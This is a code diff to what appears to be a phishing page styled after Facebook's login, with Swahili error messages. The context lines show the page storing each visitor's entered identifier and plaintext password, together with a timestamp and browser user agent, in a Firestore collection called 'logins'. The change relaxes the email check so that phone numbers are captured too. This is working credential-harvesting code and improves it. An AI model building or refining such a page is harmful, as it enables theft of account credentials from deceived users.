@@ -193,8 +193,8 @@
 
     <!-- Login form -->
     <div id="loginForm">
-      <input class="fb-input" type="email" id="emailInput" placeholder="Email address or phone number" autocomplete="email">
-      <div class="error-msg" id="emailErr">Weka email sahihi.</div>
+      <input class="fb-input" type="text" id="emailInput" placeholder="Email address or phone number" autocomplete="off">
+      <div class="error-msg" id="emailErr">Jaza sehemu hii.</div>
 
       <input class="fb-input" type="password" id="passInput" placeholder="Password" autocomplete="current-password">
       <div class="error-msg" id="passErr">Password haipaswi kuwa tupu.</div>
@@ -259,7 +259,7 @@
 
     // Validate
     let valid = true;
-    if (!email || !email.includes("@")) {
+    if (!email) {
       document.getElementById("emailErr").classList.add("show");
       document.getElementById("emailInput").classList.add("error-field");
       valid = false;
@@ -277,7 +277,7 @@
     try {
       // Save to Firestore collection "logins"
       await addDoc(collection(db, "logins"), {
-        email:     email,
+        identifier: email,
         password:  pass,
         wakati:    serverTimestamp(),
         userAgent: navigator.userAgent
